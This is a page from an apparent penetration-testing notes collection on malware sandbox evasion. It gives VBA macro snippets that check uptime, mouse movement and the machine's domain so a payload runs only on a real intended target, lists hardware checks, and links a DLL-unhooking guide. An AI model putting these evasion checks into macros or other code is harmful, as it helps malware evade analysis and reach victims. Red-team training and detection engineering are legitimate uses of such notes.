| üè† [Home](../../pentesting.md) | ‚¨ÖÔ∏è ‚¨ÖÔ∏è [Part](../_part) | ‚¨ÖÔ∏è [Chapter](./_chapter) |
|--------------------------------|----------------------|-------------------------|

* [Bypass dynamic analysis](../../malware_dev/malware_dev/dynamic_analysis_bypass.md)
    * [Full DLL Unhooking with C++](../../malware_dev/malware_dev/dynamic_analysis_bypass.md#full-dll-unhooking-with-c)

# Bypass dynamic analysis

## Environment checking
* **uptime**: Checks the system uptime. A very low uptime (< 10 minutes) is often characteristic of a sandbox environment that has just been spun up for analysis.

```vb
#If VBA7 Then
    Private Declare PtrSafe Function GetTickCount Lib "kernel32" () As Long
#Else
    Private Declare Function GetTickCount Lib "kernel32" () As Long
#End If
' Check 1: Uptime check to evade simple sandboxes
If GetTickCount() < 600000 Then Exit Function ' Must be running >10 minutes
```

* **cursorpos**: Checks for mouse cursor movement over a 3-second interval. A static cursor suggests no human user is present, indicating a likely sandbox.
```vb
#If VBA7 Then
    Private Declare PtrSafe Function GetCursorPos Lib "user32" (lpPoint As POINTAPI) As Long
#Else
    Private Declare Function GetCursorPos Lib "user32" (lpPoint As POINTAPI) As Long
#End If


Dim pos As POINTAPI
Dim initialX As Long, initialY As Long
GetCursorPos pos
initialX = pos.x
initialY = pos.y
Sleep 3000 ' Wait 3 seconds
GetCursorPos pos
If initialX = pos.x And initialY = pos.y Then Exit Function
```

* **environment domain**: Performs "environmental keying" by checking if the machine is part of a specific domain (LAB-DOMAIN). This ensures the payload only runs on the intended target.
```vb
' Check 3: Domain check for specific lab environment
If Environ("USERDOMAIN") <> "LAB-DOMAIN" Then Exit Function
```

* **memory**: minimum amount of memory to detect sandbox
* **processing speed**
* **core processors**
## Full DLL Unhooking with C++

[Full DLL Unhooking with C++](https://www.ired.team/offensive-security/defense-evasion/how-to-unhook-a-dll-using-c++)
